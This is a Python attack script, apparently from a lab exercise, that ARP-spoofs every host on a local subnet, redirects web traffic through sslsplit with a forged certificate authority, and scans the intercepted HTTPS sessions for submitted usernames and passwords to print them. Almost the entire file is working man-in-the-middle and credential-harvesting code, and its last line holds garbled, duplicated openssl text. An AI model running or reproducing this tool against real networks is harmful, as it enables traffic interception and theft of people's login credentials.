#!/usr/bin/env python3
import scapy.all as scapy
import time
import os
import socket
import netifaces
import threading
#victim ip = 192.168.132.132 mac = 00:0c:29:33:7d:a8
#attacker ip = 192.168.132.131

Username = "default"
Password = "default"
def get_my_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname + ".local")
    return local_ip

def get_gateway_ip():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]
    

def enable_ipv4_forwarding():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ipv4_forwarding():
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')


def scan(ip, gateway_ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print("IP\t\t\tMAC Address\n-------------------------------------------")
    for element in answered_list:
        if(element[1].psrc != gateway_ip):
            print(element[1].psrc + "\t\t" + element[1].hwsrc)
    return answered_list

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc #hw is the mac address


def ARP_spoof(target_ip, spoof_ip): 
    packet = scapy.ARP(op = 2, pdst = target_ip, hwsrc = scapy.Ether().src, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(dst_ip, dst_mac, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op = 2, pdst = dst_ip, hwdst = dst_mac, psrc = src_ip, hwsrc = src_mac)
    scapy.send(packet, verbose=False)

def run_arp_spoof():

    gateway_ip = str(get_gateway_ip())
    attacker_ip = str(get_my_ip())
    enable_ipv4_forwarding()

    ip_list = scan(gateway_ip + "/24", gateway_ip)
    try:
        
        while True:
            for element in ip_list: # search all the other in this subnet 
                ARP_spoof(element[1].psrc, gateway_ip) #tell everybody that me(attacker mac) is AP
                ARP_spoof(gateway_ip, element[1].psrc)
            
            time.sleep(0.1)
            


    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        for element in ip_list:
            restore(element[1].psrc, gateway_ip)

        print("[+] Arp Spoof Stopped")
        disable_ipv4_forwarding()



def ssl_split():
    try:
        
        os.system('sysctl -w net.ipv4.ip_forward=1')
        os.system('iptables -t nat -F')
        os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
        os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
        os.system('sudo rm -r tmp')
        os.system('mkdir -p tmp/sslsplit/logdir')

        os.system('sudo sslsplit -l connections.log -j tmp/sslsplit/ -S tmp/sslsplit/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 > /dev/null')
        
    except KeyboardInterrupt:
        print("sslspilt Stopped")

def ssl_str():
    substring = '140.'
    name_path = 'no'
    
    attack_success = 1
    while attack_success:
        time.sleep(1.0)
        for root, subdirs, files in os.walk('tmp/sslsplit'):
            for filename in files:
                if substring in filename:
                    name_path = os.path.join(root,filename)
                    f = open(name_path, 'r',encoding='utf-8', errors='ignore')
                    Lines = f.readlines()
                    for line in Lines:
                        if "&username=" in line:
                            str_list = line.split('&username=')
                            str_list = str_list[1].split('&password=')
                            Username = str_list[0]
                            str_list = str_list[1].split('&token=')
                            Password = str_list[0]
                            attack_success = 0
                            f.close()
                            print("Username: ", Username)
                            print("Password: ", Password)
                            return
                    f.close()
    

arp = threading.Thread(target = run_arp_spoof, daemon = True)
arp.start()
ssl_set = threading.Thread(target = ssl_split, daemon = True)
ssl_set.start()
ssl_strr = threading.Thread(target = ssl_str, daemon = True)
ssl_strr.start()

while True:
    try:
        time.sleep(0.1)
    except KeyboardInterrupt:
        print("Stopped")






#scan("192.168.132.131/24")openssl genrsa -out ca.key 4096openssl genrsa -out ca.key 4096